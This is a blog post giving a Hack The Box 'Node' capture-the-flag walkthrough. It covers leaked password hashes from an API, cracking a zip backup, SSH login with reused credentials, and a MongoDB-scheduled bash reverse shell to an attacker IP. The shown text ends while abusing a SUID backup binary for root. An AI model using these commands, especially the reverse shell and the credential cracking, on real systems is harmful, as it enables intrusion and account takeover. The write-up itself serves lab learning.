<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack The Box - Node" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/HTB-Node-Writeup/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/HTB-Node-Writeup/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-21T09:03:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Node" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-03-21T09:03:00+05:30","datePublished":"2022-03-21T09:03:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Hack The Box - Node","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/HTB-Node-Writeup/"},"url":"https://0xstarlight.github.io/posts/HTB-Node-Writeup/"}</script><title>Hack The Box - Node | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Node</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Node</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1647833580" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-21 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1995 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png" alt="image" data-proofer-ignore></p><p><strong>Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.</strong></p><hr /><h1 id="recon">Recon</h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The first thing that I do is run nmap scan that show this results:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="gp">0xStarlight@kali$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> 10.10.10.58 <span class="nt">-vv</span> <span class="o">&gt;</span> nmap_scan.conf
<span class="gp">0xStarlight@kali$</span><span class="w"> </span><span class="nb">cat </span>nmap_scan.conf
<span class="go">PORT     STATE SERVICE            REASON  VERSION
</span><span class="gp">#</span><span class="w"> </span>22/tcp   open  ssh                syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
</span><span class="gp">#</span><span class="w"> </span>3000/tcp open  hadoop-tasktracker syn-ack Apache Hadoop
<span class="go">| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>From the nmap results, we can see that there is port 3000 which is a web service that running on the server and on port 22 is SSH.</p><h2 id="website---tcp-3000"><span class="mr-2">Website - TCP 3000</span><a href="#website---tcp-3000" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>First of all, we can add the IP to our <code class="language-plaintext highlighter-rouge">/etc/host</code> folder as <code class="language-plaintext highlighter-rouge">node.htb</code></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/host
10.10.10.58 node.htb
</pre></table></code></div></div><p>Upon visiting the site, it looks like a typical social media site. It has a signup page which is currently closed, and a login page.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139860231-50796fb7-ea89-4232-8ee1-90288d34bae4.png" alt="image" data-proofer-ignore></p><p>I tried using some common usernames and passwords to log in, but none of them succeeded. Since it uses NodeJS, there’s a good chance the backend is using MongoDB. I tried some basic NoSQL injections but got no luck. I then tried feroxbuster, but that resulted in the URL redirecting all the pages to the main home page.</p><p>So none of those helped me anyhow.</p><h2 id="cracking-hashes"><span class="mr-2">Cracking Hashes</span><a href="#cracking-hashes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let us refresh the page, check the network tab, look through all the <code class="language-plaintext highlighter-rouge">*.js</code> files, and check if we find any interesting files.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139860894-9ad9e053-de44-447e-893a-588c996d5068.png" alt="image" data-proofer-ignore></p><p>I found an interesting <code class="language-plaintext highlighter-rouge">js</code> file that makes a GET request to another <code class="language-plaintext highlighter-rouge">js</code> file to pull down all the profiles.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>GET /assets/js/app/controllers/profile.js HTTP/1.1
Host: node.htb:3000
Connection: keep-alive
[SNIP...]
</pre></table></code></div></div><p>Let us look at the source code of the <code class="language-plaintext highlighter-rouge">js</code> file.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139861382-e3eba5ba-05c9-49db-845d-784529cc4337.png" alt="image" data-proofer-ignore></p><p>It is making a GET API request to <code class="language-plaintext highlighter-rouge">/api/users</code> seems to pull down the username parameter</p><p>Upon visiting the endpoint, we can see that it contains all the user’s IDs, usernames and hashes, which will allow us to log in to the webpage.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139861694-1d9cd712-0bff-44ec-81dc-342d943a052a.png" alt="image" data-proofer-ignore></p><p>We can grab the hashes and try cracking them on <a href="https://crackstation.net/">crackstation</a> to get the passwords in plain text.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139862166-b0059627-528a-456a-a2be-c5149767a0fa.png" alt="image" data-proofer-ignore></p><p>Great now we have the username and passwords in plain text. Let’s login on to the web page as <code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT</code> as it has admin privileges.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139862329-c026f889-1b47-464e-9b74-60e89ed32cdb.png" alt="image" data-proofer-ignore></p><h1 id="shell-as-mark">Shell as Mark</h1><h2 id="myplacebackup"><span class="mr-2">myplace.backup</span><a href="#myplacebackup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>After Logging in, there was an option to download a backup file. We can download the file on our local machine and start to analyze it.</p><p>We can try checking the file type first.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span>file myplace.backup           
myplace.backup: ASCII text, with very long lines, with no line terminators
</pre></table></code></div></div><p>It says ASCII text. Let us read the content of the file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">cat </span>myplace.backup                                            

UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWXrgd2F1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAynsHjHtvHInyMHK96c66FXUMDUOwEAWe+Am9h6156G33NE/wuxHi0dnBAx8vweFPkPqZtCDL3hM4F+eobU5Cerzkqznx9Fu1mCWfZFHymBPNt+ihMv+mlQbBfTJ6VQrUVmgoxcEt51mXSx5sWQ/92wOT0aZs1cxrWnlpfAS+mRr/a8HjU8ZqF6XiEhR9EIaLPeuXGFRaB7o9mT0/YvtfL1zSnzme5kdmQhquEV/4Zxo4lJv5JTbxPJeC
<span class="o">[</span>SNIP...]
</pre></table></code></div></div><p>It seems like base64 encoded ASCII text. We can pipe the file content as base64, store it into another file, and recheck the file type.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">cat </span>myplace.backup | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> unknown_file

0xStarlight@kali<span class="nv">$ </span>file unknown_file  
unknown_file: Zip archive data, at least v1.0 to extract
</pre></table></code></div></div><p>It results in a Zip archive data file. When trying to unzip, it requires a password. We can crack the password by <code class="language-plaintext highlighter-rouge">fcrackzip</code> using <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as the wordlist.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> /home/kali/rockyou.txt unknown_file 

PASSWORD FOUND!!!!: pw <span class="o">==</span> magicword
</pre></table></code></div></div><p>Lets unzip the file and check the archived content</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">ls                                                                                 
</span>app.html  app.js  node_modules  package.json  package-lock.json  static
</pre></table></code></div></div><p>After reading the content in <code class="language-plaintext highlighter-rouge">app.js</code> we can get the credentials to connect to MongoDB on localhost to myspace process.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span>batcat app.js
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139862818-fb924da2-aa05-4121-9253-1b0c5a6f9157.png" alt="image" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>mark:5AYRft[SNIP…]</p></div></blockquote><h2 id="ssh-as-mark"><span class="mr-2">SSH as Mark</span><a href="#ssh-as-mark" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let us try to logon as SSH as Mark with the same password we found from the <code class="language-plaintext highlighter-rouge">app.js</code> file. Maybe password reuse?</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span>ssh mark@10.10.10.58
</pre></table></code></div></div><p>Great we logged on !</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139863122-bc3f27d6-99db-4c26-8b8d-6dcec8fffc90.png" alt="image" data-proofer-ignore></p><h1 id="shell-as-tom">Shell as Tom</h1><p>We found MongoDB running on Mark’s machine from the downloaded backup file. We check if any node services are running on the machine and try to connect it as Mark.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>mark@node:/home<span class="nv">$ </span>ps aux | <span class="nb">grep </span>node
tom       1230  0.0  5.3 1008056 40400 ?       Ssl  18:55   0:01 /usr/bin/node /var/scheduler/app.js
tom       1234  0.0  5.6 1019880 42936 ?       Ssl  18:55   0:01 /usr/bin/node /var/www/myplace/app.js
mark      1541  0.0  0.1  14228   940 pts/0    S+   19:37   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto node
</pre></table></code></div></div><p>It looks like Tom has the same file running on a different process Let’s read the content from <code class="language-plaintext highlighter-rouge">/var/scheduler/app.js</code> file.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139863489-c429d69d-6db0-4249-b1bb-07cdc630f992.png" alt="image" data-proofer-ignore></p><p>It looks like it creates a DB collection named task. It takes an input parameter as cmd on line 18 and executes it, and then deletes it after the execution is done. So now we can privilege escalation by injecting a reverse shell in the cmd parameter. Let us try to connect to mongo DB as Mark using the scheduler process.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mark@node:/home<span class="nv">$ </span>mongo <span class="nt">-u</span> mark <span class="nt">-p</span> 5AYRft73VtFpc84k scheduler
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139863624-5789a510-bdfb-4e4b-bb95-680dd04936ec.png" alt="image" data-proofer-ignore></p><p>It seems like the DB is empty after querying the data collections.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> show collections
tasks
<span class="o">&gt;</span> db.tasks.find<span class="o">()</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> db.task.count<span class="o">()</span>
0
</pre></table></code></div></div><p>Let us add an object in the tasks collections with a cmd parameter containing a reverse shell that will connect back to Tom since the scheduler process is running as Tom.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> db.tasks.insert<span class="o">({</span><span class="s2">"cmd"</span>: <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.17/9999 0&gt;&amp;1'"</span><span class="o">})</span>
WriteResult<span class="o">({</span> <span class="s2">"nInserted"</span> : 1 <span class="o">})</span>
<span class="o">&gt;</span>
</pre></table></code></div></div><p>We got a shell as Tom !</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139863804-ab5cca2b-f3cc-47c7-943c-442ed7ac3a68.png" alt="image" data-proofer-ignore></p><h2 id="backup-suid"><span class="mr-2">backup SUID</span><a href="#backup-suid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let us check the SUID privileges for Tom user and search for any interesting files.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/home<span class="nv">$ </span>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139863921-f67a465f-7c0d-4a64-92ff-b03d4aaa85cc.png" alt="image" data-proofer-ignore></p><p>I found an interesting file <code class="language-plaintext highlighter-rouge">backup</code>, with file permissions as <code class="language-plaintext highlighter-rouge">admin</code> to execute. We can execute the file since we have GUID as <code class="language-plaintext highlighter-rouge">admin</code> as Tom. On executing the file, it doesn’t return anything.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>/usr/local/bin/backup
</pre></table></code></div></div><p>I do remember that there was a process that spawns backup on <code class="language-plaintext highlighter-rouge">api.js</code> whcih we found earlier. Let’s read that and see what it does.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>var proc <span class="o">=</span> spawn<span class="o">(</span><span class="s1">'/usr/local/bin/backup'</span>, <span class="o">[</span><span class="s1">'-q'</span>, backup_key, __dirname <span class="o">])</span><span class="p">;</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139864170-23104d87-26b9-4b6e-ae26-84d2a6f726cb.png" alt="image" data-proofer-ignore></p><p>It takes three parameters: <code class="language-plaintext highlighter-rouge">-q</code>, then a backup key and a directory name. Let us run the file using <code class="language-plaintext highlighter-rouge">strace</code> to check what’s happening.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>strace /usr/local/bin/backup a a a
</pre></table></code></div></div><p>At the end of the file we can notice its trying read the content of <code class="language-plaintext highlighter-rouge">"/etc/myplace/keys"</code> file.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="o">[</span>SNIP...]

<span class="o">)</span> <span class="o">=</span> 81
write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1
<span class="o">)</span>                       <span class="o">=</span> 1
open<span class="o">(</span><span class="s2">"/etc/myplace/keys"</span>, O_RDONLY<span class="o">)</span>     <span class="o">=</span> 3
fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG|0644, <span class="nv">st_size</span><span class="o">=</span>196, ...<span class="o">})</span> <span class="o">=</span> 0
<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f"</span>..., 4096<span class="o">)</span> <span class="o">=</span> 196
<span class="nb">read</span><span class="o">(</span>3, <span class="s2">""</span>, 4096<span class="o">)</span>                       <span class="o">=</span> 0
write<span class="o">(</span>1, <span class="s2">" </span><span class="se">\3</span><span class="s2">3[33m[!]</span><span class="se">\3</span><span class="s2">3[37m Ah-ah-ah! You did"</span>..., 57 <span class="o">[!]</span> Ah-ah-ah! You didn<span class="s1">'t say the magic word!

) = 57
[SNIP...]
</span></pre></table></code></div></div><p>After reading the file’s content, We can figure that it contains some keys. Maybe we can use these keys and read the root directory?</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span><span class="nb">cat</span> /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
</pre></table></code></div></div><h1 id="shell-as-root">Shell as Root</h1><h2 id="read-flag-only--path-i-"><span class="mr-2">Read Flag only [ Path I ]</span><a href="#read-flag-only--path-i-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Since now we have the keys and know how it works, let us try to read the root directory folder.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>backup <span class="nt">-q</span> a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root
